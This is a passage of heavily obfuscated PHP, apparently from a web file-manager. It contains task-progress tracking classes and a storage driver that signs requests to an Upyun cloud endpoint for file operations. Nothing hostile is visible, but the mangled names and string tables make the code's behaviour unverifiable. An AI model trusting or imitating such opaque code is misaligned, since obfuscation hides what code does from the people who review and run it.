$”É•ı¾½[1824])); Hook::unbind($”É•ı¾½[1825], array($this, $”É•ı¾½[1826])); Hook::unbind($”É•ı¾½[1827], array($this, $”É•ı¾½[1828])); } public function copyMoveStart($—éøÊá, $³†«¦·Ú, $¾ùÛÜ¡, $ÚÚÆÙ×à) { $Ä÷÷†Ù‰ =& $_SERVER[äô®•½Â]; self::log($Ä÷÷†Ù‰[1838] . $³†«¦·Ú . $Ä÷÷†Ù‰[73] . $ÚÚÆÙ×à); $±İğ‚Û = rtrim(TEMP_FILES, $Ä÷÷†Ù‰[8]); if (substr($³†«¦·Ú, 0, strlen($±İğ‚Û)) == $±İğ‚Û) { return; } if (substr($ÚÚÆÙ×à, 0, strlen($±İğ‚Û)) == $±İğ‚Û) { return; } $Èƒã¨‰† =& $this->task; $Èƒã¨‰†[$Ä÷÷†Ù‰[1839]] = KodIO::transferType($—éøÊá, $¾ùÛÜ¡); $this->update(); } public function updateAfter() { $©™÷ÜÖ± =& $_SERVER[äô®•½Â]; $ÈÍß®ú£ =& $this->task; if (!$ÈÍß®ú£[$©™÷ÜÖ±[829]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÈÍß®ú£[$©™÷ÜÖ±[1839]] == $©™÷ÜÖ±[1407]) { return; } self::updateTask($ÈÍß®ú£); } private static function updateTask(&$ƒ€ª ïÅ) { $¨éƒìõö =& $_SERVER[äô®•½Â]; if ($ƒ€ª ïÅ[$¨éƒìõö[1839]] == $¨éƒìõö[1277] || $ƒ€ª ïÅ[$¨éƒìõö[1839]] == $¨éƒìõö[110]) { if ($ƒ€ª ïÅ[$¨éƒìõö[1833]]) { $ƒ€ª ïÅ[$¨éƒìõö[1836]] = $ƒ€ª ïÅ[$¨éƒìõö[1835]] + $ƒ€ª ïÅ[$¨éƒìõö[1832]]; } } else { if ($ƒ€ª ïÅ[$¨éƒìõö[1839]] == $¨éƒìõö[1408]) { if ($ƒ€ª ïÅ[$¨éƒìõö[1833]] == $¨éƒìõö[1277]) { $ƒ€ª ïÅ[$¨éƒìõö[1836]] = $ƒ€ª ïÅ[$¨éƒìõö[1835]] + $ƒ€ª ïÅ[$¨éƒìõö[1832]] * 0.5; } else { if ($ƒ€ª ïÅ[$¨éƒìõö[1833]] == $¨éƒìõö[110]) { $ƒ€ª ïÅ[$¨éƒìõö[1836]] = $ƒ€ª ïÅ[$¨éƒìõö[1835]] + $ƒ€ª ïÅ[$¨éƒìõö[1831]] * 0.5 + $ƒ€ª ïÅ[$¨éƒìõö[1832]] * 0.5; } } } } $ƒ€ª ïÅ[$¨éƒìõö[1779]] = $ƒ€ª ïÅ[$¨éƒìõö[1836]] / $ƒ€ª ïÅ[$¨éƒìõö[829]]; if ($ƒ€ª ïÅ[$¨éƒìõö[1779]] > 0) { $¬™ÃÇ´ = timeFloat() - $ƒ€ª ïÅ[$¨éƒìõö[1781]] - $ƒ€ª ïÅ[$¨éƒìõö[1784]]; $ƒ€ª ïÅ[$¨éƒìõö[1785]] = $¬™ÃÇ´ * (1 - $ƒ€ª ïÅ[$¨éƒìõö[1779]]) / $ƒ€ª ïÅ[$¨éƒìõö[1779]]; } } public function addPath($íÏê¥Ÿ) { $åØÂîøÇ =& $_SERVER[äô®•½Â]; if (!$íÏê¥Ÿ) { return; } $Ûâ“üíö =& $this->task; $Ñœİö‰ƒ = IO::infoWithChildren($íÏê¥Ÿ); $õ×Ø¶ã = $Ûâ“üíö[$åØÂîøÇ[1840]] ? $Ûâ“üíö[$åØÂîøÇ[1840]][$åØÂîøÇ[1841]] : 0; $Ûâ“üíö[$åØÂîøÇ[1840]] = array($åØÂîøÇ[1841] => $õ×Ø¶ã + 1, $åØÂîøÇ[505] => $Ñœİö‰ƒ[$åØÂîøÇ[32]], $åØÂîøÇ[87] => $Ñœİö‰ƒ[$åØÂîøÇ[87]], $åØÂîøÇ[595] => $Ñœİö‰ƒ[$åØÂîøÇ[595]] ? $Ñœİö‰ƒ[$åØÂîøÇ[595]] : $Ñœİö‰ƒ[$åØÂîøÇ[87]]); if ($Ñœİö‰ƒ[$åØÂîøÇ[33]] == $åØÂîøÇ[233]) { $Ûâ“üíö[$åØÂîøÇ[1135]] += 1; } else { $Ûâ“üíö[$åØÂîøÇ[1135]] += $Ñœİö‰ƒ[$åØÂîøÇ[82]][$åØÂîøÇ[80]]; if ($Ñœİö‰ƒ[$åØÂîøÇ[194]]) { $Ûâ“üíö[$åØÂîøÇ[1135]] += $Ñœİö‰ƒ[$åØÂîøÇ[82]][$åØÂîøÇ[81]] + 1; } } $Ûâ“üíö[$åØÂîøÇ[829]] += $Ñœİö‰ƒ[$åØÂîøÇ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ «èä¹˜) { } public function sourceAddHashEnd($ĞÂ«•ı¡) { } public function sourceAddFileStart($’Í¸¥Ì) { $ğË‰ı»ø =& $_SERVER[äô®•½Â]; $ïº‘£üÖ =& $this->task; $ïº‘£üÖ[$ğË‰ı»ø[1831]] = $’Í¸¥Ì[$ğË‰ı»ø[79]]; $ïº‘£üÖ[$ğË‰ı»ø[1829]] = $’Í¸¥Ì[$ğË‰ı»ø[32]]; $ïº‘£üÖ[$ğË‰ı»ø[1137]] = $’Í¸¥Ì[$ğË‰ı»ø[32]]; $ïº‘£üÖ[$ğË‰ı»ø[1842]] = $’Í¸¥Ì[$ğË‰ı»ø[87]]; $this->update(); } public function sourceAddFileEnd($–¦åñ¦ß) { $Şó¹ß» =& $_SERVER[äô®•½Â]; $âÉŒÜõò =& $this->task; $âÉŒÜõò[$Şó¹ß»[1836]] += $–¦åñ¦ß[$Şó¹ß»[79]]; $âÉŒÜõò[$Şó¹ß»[1842]] = $–¦åñ¦ß[$Şó¹ß»[87]]; $this->update(1); } public function copyFileStart($¹‘öÕïÙ, $—•Ùõ±ï, $¼Ÿ­õª, $´÷‡İ Ï, $¯û¯Ã»ò, $Â¤«ø‹¥) { $÷ßˆ—ƒè =& $_SERVER[äô®•½Â]; $ßÍ ¶Å = $¯û¯Ã»ò; if ($ßÍ ¶Å == $GLOBALS[$÷ßˆ—ƒè[1843]]) { $ßÍ ¶Å = $GLOBALS[$÷ßˆ—ƒè[1844]]; } $GLOBALS[$÷ßˆ—ƒè[1844]] = $¯û¯Ã»ò; $GLOBALS[$÷ßˆ—ƒè[1843]] = $Â¤«ø‹¥; $±ˆáàìË =& $this->task; $±ˆáàìË[$÷ßˆ—ƒè[1829]] = $ßÍ ¶Å; $±ˆáàìË[$÷ßˆ—ƒè[1831]] = (int) $¹‘öÕïÙ->size($—•Ùõ±ï); $±ˆáàìË[$÷ßˆ—ƒè[1832]] = 0; $±ˆáàìË[$÷ßˆ—ƒè[1137]] = $÷ßˆ—ƒè[12]; $±ˆáàìË[$÷ßˆ—ƒè[1833]] = $÷ßˆ—ƒè[12]; $±ˆáàìË[$÷ßˆ—ƒè[1834]] = 0; $ÀºÍóÙİ = $±ˆáàìË[$÷ßˆ—ƒè[1831]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($±ˆáàìË[$÷ßˆ—ƒè[486]] . $÷ßˆ—ƒè[1845]); if ($ÀºÍóÙİ && file_exists(get_path_father($´÷‡İ Ï))) { Cache::set($±ˆáàìË[$÷ßˆ—ƒè[486]] . $÷ßˆ—ƒè[1845], $´÷‡İ Ï); $±ˆáàìË[$÷ßˆ—ƒè[1802]] = array($÷ßˆ—ƒè[1846], $÷ßˆ—ƒè[1847]); } $this->update(0, $ÀºÍóÙİ); } public static function updateCopyLocalFileSize($ßƒ•¿‘Ò) { $•ûÀ€ˆ =& $_SERVER[äô®•½Â]; $°®å´ÅÍ = Cache::get($ßƒ•¿‘Ò[$•ûÀ€ˆ[486]] . $•ûÀ€ˆ[1845]); if (!$°®å´ÅÍ || !file_exists($°®å´ÅÍ)) { return $ßƒ•¿‘Ò; } $ßƒ•¿‘Ò[$•ûÀ€ˆ[1832]] = @filesize($°®å´ÅÍ); $ßƒ•¿‘Ò[$•ûÀ€ˆ[1836]] += $ßƒ•¿‘Ò[$•ûÀ€ˆ[1832]]; self::updateTask($ßƒ•¿‘Ò); return $ßƒ•¿‘Ò; } public function copyFileEnd($±È×¡€, $ÍµÒ¢•Ë, $íæç¤î², $´¸ÉğÙ, $˜ÓÚ”Ì€, $Ãµ¢ÖÚ) { $²÷ı’„Õ =& $_SERVER[äô®•½Â]; $èõÄ‹¿– =& $this->task; $èõÄ‹¿–[$²÷ı’„Õ[1832]] = $èõÄ‹¿–[$²÷ı’„Õ[1831]]; $èõÄ‹¿–[$²÷ı’„Õ[1833]] = $²÷ı’„Õ[12]; unset($èõÄ‹¿–[$²÷ı’„Õ[1802]]); if ($˜ÓÚ”Ì€ == $èõÄ‹¿–[$²÷ı’„Õ[1829]]) { $èõÄ‹¿–[$²÷ı’„Õ[1835]] += $èõÄ‹¿–[$²÷ı’„Õ[1831]]; $èõÄ‹¿–[$²÷ı’„Õ[1836]] = $èõÄ‹¿–[$²÷ı’„Õ[1835]]; $Òş€Ã = 1; if (isset($èõÄ‹¿–[$²÷ı’„Õ[1842]]) && $èõÄ‹¿–[$²÷ı’„Õ[1842]] == $ÍµÒ¢•Ë) { $Òş€Ã = 0; } $this->update($Òş€Ã); } else { $this->update(); $èõÄ‹¿–[$²÷ı’„Õ[1832]] = 0; } Cache::remove($èõÄ‹¿–[$²÷ı’„Õ[486]] . $²÷ı’„Õ[1845]); self::log($²÷ı’„Õ[1848] . $ÍµÒ¢•Ë . $²÷ı’„Õ[73] . $´¸ÉğÙ . $²÷ı’„Õ[288] . $˜ÓÚ”Ì€ . $²÷ı’„Õ[1849] . $èõÄ‹¿–[$²÷ı’„Õ[1829]]); } public function updateFileEnd($ÜÆÚØ¯İ, $€ªÄÈ·Ï) { $’õê˜› =& $_SERVER[äô®•½Â]; $úóÄµÑ¾ =& $this->task; $úóÄµÑ¾[$’õê˜›[1829]] = $ÜÆÚØ¯İ; $úóÄµÑ¾[$’õê˜›[1831]] = $€ªÄÈ·Ï; $úóÄµÑ¾[$’õê˜›[1835]] += $€ªÄÈ·Ï; $úóÄµÑ¾[$’õê˜›[1836]] = $úóÄµÑ¾[$’õê˜›[1835]]; $this->update(1); self::log($’õê˜›[1850] . $ÜÆÚØ¯İ); } public function sourceModelCopy($Ó¬±ùëÏ) { $¢Îóì¿° =& $_SERVER[äô®•½Â]; $µÁé…‰× = $Ó¬±ùëÏ[0]; $Ã–´íĞ = $Ó¬±ùëÏ[1]; $¸ùÊ®ÅÂ =& $this->task; $this->sourceModelCopyFlag = !0; $Î¾ÊÆ£ = 0; switch ($µÁé…‰×) { case $¢Îóì¿°[651]: $Î¾ÊÆ£ = 1; break; case $¢Îóì¿°[654]: $¸ùÊ®ÅÂ[$¢Îóì¿°[1829]] = $Ã–´íĞ[$¢Îóì¿°[32]]; break; case $¢Îóì¿°[656]: $Î¾ÊÆ£ = intval($Ó¬±ùëÏ[$¢Îóì¿°[467]] * 0.4); break; case $¢Îóì¿°[658]: $Î¾ÊÆ£ = intval($Ó¬±ùëÏ[$¢Îóì¿°[467]] * 0.2); break; case $¢Îóì¿°[660]: $Î¾ÊÆ£ = intval($Ó¬±ùëÏ[$¢Îóì¿°[467]] * 0.4); break; } $this->update($Î¾ÊÆ£); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ìşØ½°¡, $¬Ñ¶„›’) { $äæ½Ã­İ =& $_SERVER[äô®•½Â]; $this->sourceModelCopyFlag = !0; $˜›ÁöÒ = 1; if (isset($ìşØ½°¡[$äæ½Ã­İ[82]])) { $˜›ÁöÒ = $ìşØ½°¡[$äæ½Ã­İ[82]][$äæ½Ã­İ[80]]; $˜›ÁöÒ = $˜›ÁöÒ + $ìşØ½°¡[$äæ½Ã­İ[82]][$äæ½Ã­İ[81]] + 1; } $this->update($˜›ÁöÒ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ûä¶ÕË) { $this->sourceRemove($Ûä¶ÕË, !1); } public function curlProgress($—õÚ£·¢, $ÁßÒÃÚ, $àˆÄ—À, $âĞ”é‰, $ÍĞ±¿¿Ú) { $°Ë½§÷Ÿ =& $_SERVER[äô®•½Â]; $ÛñÖğÉ¬ =& $this->task; if ($ÍĞ±¿¿Ú > 0) { $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1137]] = $°Ë½§÷Ÿ[1851]; $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1833]] = $°Ë½§÷Ÿ[110]; if ($ÛñÖğÉ¬[$°Ë½§÷Ÿ[1831]]) { $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1832]] = $ÍĞ±¿¿Ú; } if ($ÛñÖğÉ¬[$°Ë½§÷Ÿ[1834]]) { $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1832]] = $ÍĞ±¿¿Ú + $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1834]]; } } else { if ($àˆÄ—À > 0) { if ($ÛñÖğÉ¬[$°Ë½§÷Ÿ[1831]] == $ÁßÒÃÚ) { $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1832]] = $àˆÄ—À; $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1137]] = $°Ë½§÷Ÿ[1852]; $ÛñÖğÉ¬[$°Ë½§÷Ÿ[1833]] = $°Ë½§÷Ÿ[1277]; } } } $this->update(); } public function curlProgressStart($ãş¡µİÏ) { } public function curlProgressEnd($àä¥äµ²) { $Âè“º®ü =& $_SERVER[äô®•½Â]; $´ıĞ´ =& $this->task; $É¸ò¿Ø« = curl_getinfo($àä¥äµ²); $™ªµ°³± = $É¸ò¿Ø«[$Âè“º®ü[1853]]; if ($™ªµ°³± == -1) { $™ªµ°³± = $É¸ò¿Ø«[$Âè“º®ü[1854]]; } if ($´ıĞ´[$Âè“º®ü[1833]] == $Âè“º®ü[110] && $™ªµ°³±) { $´ıĞ´[$Âè“º®ü[1834]] += $™ªµ°³±; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $» şõúõ =& $_SERVER[äô®•½Â]; $ˆÒæ˜Ñã =& $this->task; $ˆÒæ˜Ñã[$» şõúõ[1855]] = 1; Hook::bind($» şõúõ[1823], array($this, $» şõúõ[1856])); Hook::bind($» şõúõ[1825], array($this, $» şõúõ[1857])); Hook::bind($» şõúõ[1827], array($this, $» şõúõ[1858])); } protected function endAfter() { $úÎ»ÇÍ =& $_SERVER[äô®•½Â]; Hook::unbind($úÎ»ÇÍ[1823], array($this, $úÎ»ÇÍ[1856])); Hook::unbind($úÎ»ÇÍ[1825], array($this, $úÎ»ÇÍ[1857])); Hook::unbind($úÎ»ÇÍ[1827], array($this, $úÎ»ÇÍ[1858])); } public function progressStart($í›Ùöœä) { $İš£ÈÄî =& $_SERVER[äô®•½Â]; $ƒşØ¯“ó = curl_getinfo($í›Ùöœä); self::log($İš£ÈÄî[1859] . $ƒşØ¯“ó[$İš£ÈÄî[393]]); self::valueSet($this->task[$İš£ÈÄî[486]], $this->task); } public function progressEnd($Î™”èİ) { $ÌÕÇ´ =& $_SERVER[äô®•½Â]; self::log($ÌÕÇ´[1860] . $this->task[$ÌÕÇ´[486]]); $this->end(); } public function progress($°ÉÅŒŸ€, $½çÜâ¿’, $êÉ½‘˜‰, $˜Âº¹ÇÔ, $üËÁıİó) { $íÀÑ˜íÏ =& $_SERVER[äô®•½Â]; $˜û”Ê¨ê =& $this->task; if ($üËÁıİó > 0) { $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]] = $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]] == 0 ? $˜Âº¹ÇÔ : $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]]; $˜û”Ê¨ê[$íÀÑ˜íÏ[1778]] = $üËÁıİó; } else { if ($êÉ½‘˜‰ > 0) { $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]] = $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]] == 0 ? $½çÜâ¿’ : $˜û”Ê¨ê[$íÀÑ˜íÏ[1135]]; $˜û”Ê¨ê[$íÀÑ˜íÏ[1778]] = $êÉ½‘˜‰; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\163\110\164\164\x70\x3a\144\157\x77\156\72{$êÉ½‘˜‰}\x2f{$½çÜâ¿’}\x3b\x20\x75\160\154\157\141\x64\x3a{$üËÁıİó}\57{$˜Âº¹ÇÔ}\73"); } } goto d©¿öŠ”ÊŒ; eÏÌ³ˆ¼©‘: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ùß·²Û…, $Á’¯Ó›Ú = 0) { parent::__construct(); $this->source = $ùß·²Û…; $this->sourceSize = $Á’¯Ó›Ú; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‹åÊ™‡Ù = false) { return $this->sourceSize; } public function getContent($¨ê¸èÔš = false) { return $this->fileSubstr($¨ê¸èÔš, 0, $this->sourceSize); } public function fileSubstr($—§³“ = false, $¿ÓàÄ” = 0, $ûøæÉå¡ = 0) { if (!$ûøæÉå¡) { $ûøæÉå¡ = $this->sourceSize; } $ÍÉ­“òë = $this->sourceSize - $¿ÓàÄ”; if ($ûøæÉå¡ >= $ÍÉ­“òë) { $ûøæÉå¡ = $ÍÉ­“òë; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¿ÓàÄ”, $ûøæÉå¡); } if ($this->sourceType == self::TYPE_FILE) { if ($ûøæÉå¡ <= 0) { return $_SERVER[äô®•½Â][12]; } $«„öŸ€¯ = ftell($this->source); fseek_64($this->source, $«„öŸ€¯ + $¿ÓàÄ”); $‚’¼¿½Æ = @fread($this->source, $ûøæÉå¡); fseek_64($this->source, $«„öŸ€¯); return $‚’¼¿½Æ; } } public function hashMd5($¬£€èß = false) { return md5($this->getContent()); } public static function hash($ıø¥ªñ, $Ş¤ˆµ‚ = 0) { $İ‡¯¯…  = new PathDriverStream($ıø¥ªñ, $Ş¤ˆµ‚); return $İ‡¯¯… ->hashSimple($ıø¥ªñ); } public static function md5($¼½–ÎµÆ, $—¯”Ç÷Ú = 0) { $ú•…Ôâ = new PathDriverStream($¼½–ÎµÆ, $—¯”Ç÷Ú); return $ú•…Ôâ->hashMd5($¼½–ÎµÆ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\x76\60\x2e\141\x70\x69\x2e\165\x70\x79\165\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¯…¼‰ë¼) { parent::__construct(); $this->_init($¯…¼‰ë¼); } public function _init($ ¨©š“Á) { $±ñâ­Ìá =& $_SERVER[äô®•½Â]; foreach ($ ¨©š“Á as $·ú¤ø‰ë => $Îû¯­ŒÚ) { if (isset($this->{$·ú¤ø‰ë})) { $this->{$·ú¤ø‰ë} = $Îû¯­ŒÚ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($±ñâ­Ìá[1550] . LNG($±ñâ­Ìá[1470])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($äÏ—øûã, $ôÄ‘ƒ¢Ï = "\x47\105\x54") { $İÊŸŸºƒ =& $_SERVER[äô®•½Â]; $ÎÎÊóù = gmdate($İÊŸŸºƒ[1499]); $˜‡Î‹Åó = base64_encode(hash_hmac($İÊŸŸºƒ[1551], "{$ôÄ‘ƒ¢Ï}\x26{$äÏ—øûã}\x26{$ÎÎÊóù}", md5("{$this->userpass}"), !0)); $½Ö™Ú™– = array("\x41\165\164\150\157\162\x69\172\141\164\151\x6f\x6e\x3a\x55\120\131\x55\x4e\x20{$this->username}\x3a{$˜‡Î‹Åó}", "\x44\141\x74\145\72{$ÎÎÊóù}"); return $½Ö™Ú™–; } public function ussRequest($¸˜¬¨ÓÓ, $µôÂŞ¿â = "\x47\x45\124", $÷Ğö­ = false, $±ä»ßœö = false, $ıÜ¶™Èç = false) { $…½®Ìº =& $_SERVER[äô®•½Â]; $¸˜¬¨ÓÓ = trim($¸˜¬¨ÓÓ, $…½®Ìº[8]); $—®·ëææ = "\57{$this->bucket}\x2f" . rawurlencode($¸˜¬¨ÓÓ); $æç¤ËåÌ = $this->ussHeaders($—®·ëææ, $µôÂŞ¿â); if ($±ä»ßœö) { $æç¤ËåÌ = array_merge($æç¤ËåÌ, $±ä»ßœö); } $ÜÀ•û¤Â = url_request($this->endpoint . $—®·ëææ, $µôÂŞ¿â, $÷Ğö­, $æç¤ËåÌ, $ıÜ¶™Èç); if (!$ÜÀ•û¤Â) { $ğıÄ¯ìÃ = LNG($…½®Ìº[1552]); $this->writeLog($ğıÄ¯ìÃ); return array($…½®Ìº[1295] => !1, $…½®Ìº[1285] => $ğıÄ¯ìÃ); } if (strtolower($µôÂŞ¿â) == $…½®Ìº[230] || in_array($ÜÀ•û¤Â[$…½®Ìº[1295]], array($…½®Ìº[264], $…½®Ìº[1553]))) { $÷Ğö­ = $ÜÀ•û¤Â[$…½®Ìº[1554]]; if (!$ÜÀ•û¤Â[$…½®Ìº[815]]) { $÷Ğö­ = isset($÷Ğö­[0]) ? $÷Ğö­[0] : $…½®Ìº[12]; } } else { $÷Ğö­ = json_decode($ÜÀ•û¤Â[$…½®Ìº[1285]], !0); if (!$÷Ğö­) { $÷Ğö­ = $ÜÀ•û¤Â[$…½®Ìº[1285]]; } else { if (!$ÜÀ•û¤Â[$…½®Ìº[815]] && isset($÷Ğö­[$…½®Ìº[1555]])) { $÷Ğö­ = $÷Ğö­[$…½®Ìº[1555]]; } } } if (!$ÜÀ•û¤Â[$…½®Ìº[815]]) { $this->writeLog($this->__errorMessage($÷Ğö­)); } return array($…½®Ìº[1295] => $ÜÀ•û¤Â[$…½®Ìº[815]], $…½®Ìº[1285] => $÷Ğö­); } private function __errorMessage($Á±³…ç) { $€µŸÜù… =& $_SERVER[äô®•½Â]; if (!$Á±³…ç) { return $€µŸÜù…[12]; } static $õ‡©Àß¥ = null; if (!$õ‡©Àß¥) { $õ‡©Àß¥ = I18n::getType(); } if ($õ‡©Àß¥ != $€µŸÜù…[1508]) { return $Á±³…ç; } $¬¡Ş¶€ú = array($€µŸÜù…[1556] => $€µŸÜù…[1557], $€µŸÜù…[1558] => $€µŸÜù…[1559], $€µŸÜù…[1560] => $€µŸÜù…[1559], $€µŸÜù…[1561] => $€µŸÜù…[1562], $€µŸÜù…[1563] => $€µŸÜù…[1564], $€µŸÜù…[1565] => $€µŸÜù…[1566], $€µŸÜù…[1567] => $€µŸÜù…[1568]); return isset($¬¡Ş¶€ú[$Á±³…ç]) ? $¬¡Ş¶€ú[$Á±³…ç] : $Á±³…ç; } public function mkfile($¤Ï¶øŞÎ, $şó½½Åå = '', $ŒáÔÆ‰Ü = REPEAT_RENAME) { if ($this->setContent($¤Ï¶øŞÎ, $şó½½Åå)) { return $this->getPathOuter($¤Ï¶øŞÎ); } return !1; } public function mkdir($¬¬Ò‰æå, $êò®ğ¯ = REPEAT_SKIP) { $—ªŒ÷¯ =& $_SERVER[äô®•½Â]; $÷°âûû¸ = trim($¬¬Ò‰æå, $—ªŒ÷¯[8]); if ($this->_isFolder($÷°âûû¸)) { return $this->getPathOuter($÷°âûû¸); } $è™²Çİş = array($—ªŒ÷¯[1569]); $°Ø‘˜  = $this->ussRequest($÷°âûû¸, $—ªŒ÷¯[291], !1, $è™²Çİş); return $°Ø‘˜ [$—ªŒ÷¯[1295]] ? $this->getPathOuter($÷°âûû¸) : !1; } public function copyFile($¢Ì©º­, $»ÒÍ›é¡) { $¥„‰ÎİÃ =& $_SERVER[äô®•½Â]; $ŠÀ¥Ò¯˜ = array($¥„‰ÎİÃ[1570] . "\x2f{$this->bucket}\57{$¢Ì©º­}", $¥„‰ÎİÃ[1571]); $œ×ßì¯† = $this->ussRequest($»ÒÍ›é¡, $¥„‰ÎİÃ[256], !1, $ŠÀ¥Ò¯˜); return $œ×ßì¯†[$¥„‰ÎİÃ[1295]] ? !0 : $this->getPathOuter($»ÒÍ›é¡); } public function moveFile($™§Ÿ¿ªş, $Ë²¤ÊõÂ) { $Ä­µæå =& $_SERVER[äô®•½Â]; $•İ¨¦ = array($Ä­µæå[1572] . "\x2f{$this->bucket}\57{$™§Ÿ¿ªş}", $Ä­µæå[1571]); $“ˆ‘Ç¾Ñ = $this->ussRequest($Ë²¤ÊõÂ, $Ä­µæå[256], !1, $•İ¨¦); return $“ˆ‘Ç¾Ñ[$Ä­µæå[1295]] ? !0 : $this->getPathOuter($Ë²¤ÊõÂ); } public function delFile($©š‹ ¯) { $ØÓø›ß• =& $_SERVER[äô®•½Â]; $¢‡Í±® = $this->ussRequest($©š‹ ¯, $ØÓø›ß•[1573]); return $¢‡Í±®[$ØÓø›ß•[1295]] ? !0 : !1; } public function delFolder($ˆÁã£î) { $€´¢óøÔ =& $_SERVER[äô®•½Â]; if (!$this->exist($ˆÁã£î)) { return !0; } $this->listItemCache = !1; $ƒ²®Şˆˆ = $â­¢ƒİ = array(); $this->fileList($ˆÁã£î, $ƒ²®Şˆˆ, $â­¢ƒİ, !0); $this->listItemCache = !0; foreach ($â­¢ƒİ as $•š¯ğóà) { $Ö¬ÌÔ¼ = $this->ussRequest($•š¯ğóà[$€´¢óøÔ[32]], $€´¢óøÔ[1573]); if (!$Ö¬ÌÔ¼[$€´¢óøÔ[1295]]) { return !1; } } usort($ƒ²®Şˆˆ, function ($„ÑÒÉŞŠ, $çÕØˆøÉ) { $Ù ‡Ÿøé =& $_SERVER[äô®•½Â]; return substr_count($çÕØˆøÉ, $Ù ‡Ÿøé[8]) - substr_count($„ÑÒÉŞŠ, $Ù ‡Ÿøé[8]); }); foreach ($ƒ²®Şˆˆ as $šÜ‡óÉÈ) { $Ö¬ÌÔ¼ = $this->ussRequest($šÜ‡óÉÈ, $€´¢óøÔ[1573]); if (!$Ö¬ÌÔ¼[$€´¢óøÔ[1295]]) { return !1; } } $Ö¬ÌÔ¼ = $this->ussRequest($ˆÁã£î, $€´¢óøÔ[1573]); return $Ö¬ÌÔ¼[$€´¢óøÔ[1295]]; } public function rename($àÑ›˜º¿, $Â¹Ïæ…–) { if ($this->isFile($àÑ›˜º¿)) { $Â¹Ïæ…– = get_path_father($àÑ›˜º¿) . $Â¹Ïæ…–; return $this->moveFile($àÑ›˜º¿, $Â¹Ïæ…–); } return $this->renameObject($àÑ›˜º¿, $Â¹Ïæ…–); } public function fileInfo($‚·¢â¨¬, $¯Ææùîõ = false, $Ôòì´úè = array()) { $ãú¦‹²¹ =& $_SERVER[äô®•½Â]; $½ÔêÆ¨— = array($ãú¦‹²¹[32] => $this->pathThis($‚·¢â¨¬), $ãú¦‹²¹[87] => $this->getPathOuter($ãú¦‹²¹[8] . $‚·¢â¨¬), $ãú¦‹²¹[33] => $ãú¦‹²¹[233], $ãú¦‹²¹[79] => isset($Ôòì´úè[$ãú¦‹²¹[79]]) ? $Ôòì´úè[$ãú¦‹²¹[79]] : 0, $ãú¦‹²¹[169] => $this->ext($‚·¢â¨¬)); if ($¯Ææùîõ) { return $½ÔêÆ¨—; } $½ÔêÆ¨—[$ãú¦‹²¹[234]] = $½ÔêÆ¨—[$ãú¦‹²¹[88]] = 0; $½ÔêÆ¨—[$ãú¦‹²¹[235]] = $½ÔêÆ¨—[$ãú¦‹²¹[236]] = !0; if (empty($Ôòì´úè)) { $Ôòì´úè = $this->objectMeta($‚·¢â¨¬); if (!$Ôòì´úè) { return $½ÔêÆ¨—; } } $½ÔêÆ¨—[$ãú¦‹²¹[234]] = intval($Ôòì´úè[$ãú¦‹²¹[1574]]); $½ÔêÆ¨—[$ãú¦‹²¹[88]] = intval($Ôòì´úè[$ãú¦‹²¹[1575]]); $½ÔêÆ¨—[$ãú¦‹²¹[79]] = $Ôòì´úè[$ãú¦‹²¹[79]]; return $½ÔêÆ¨—; } public function folderInfo($ù­™Ò‰, $çÔ®€îä = false) { $”¡ŒÅ›® =& $_SERVER[äô®•½Â]; $…İĞÆ‡ò = array($”¡ŒÅ›®[32] => $this->pathThis($ù­™Ò‰), $”¡ŒÅ›®[87] => $this->getPathOuter($”¡ŒÅ›®[8] . $ù­™Ò‰), $”¡ŒÅ›®[33] => $”¡ŒÅ›®[78]); if ($çÔ®€îä) { return $…İĞÆ‡ò; } $…İĞÆ‡ò[$”¡ŒÅ›®[234]] = $…İĞÆ‡ò[$”¡ŒÅ›®[88]] = 0; $…İĞÆ‡ò[$”¡ŒÅ›®[235]] = $…İĞÆ‡ò[$”¡ŒÅ›®[236]] = !0; if (empty($»ŒïÌ–Š)) { $»ŒïÌ–Š = $this->objectMeta($ù­™Ò‰); if (!$»ŒïÌ–Š) { return $…İĞÆ‡ò; } } $…İĞÆ‡ò[$”¡ŒÅ›®[234]] = intval($»ŒïÌ–Š[$”¡ŒÅ›®[1574]]); $…İĞÆ‡ò[$”¡ŒÅ›®[88]] = intval($»ŒïÌ–Š[$”¡ŒÅ›®[1575]]); return $…İĞÆ‡ò; } private function listObjs($ñÔ“çˆà, $®Ï¡›Õô = 0, $ËÈñË”Ú = 1000) { $˜ôÁ­Úü =& $_SERVER[äô®•½Â]; $å–÷İÍ = array($˜ôÁ­Úü[1576], $˜ôÁ­Úü[1577] . $ËÈñË”Ú); if ($®Ï¡›Õô) { $å–÷İÍ[] = $˜ôÁ­Úü[1578] . $®Ï¡›Õô; } $¯´†¨å‡ = $this->ussRequest($ñÔ“çˆà, $˜ôÁ­Úü[1501], !1, 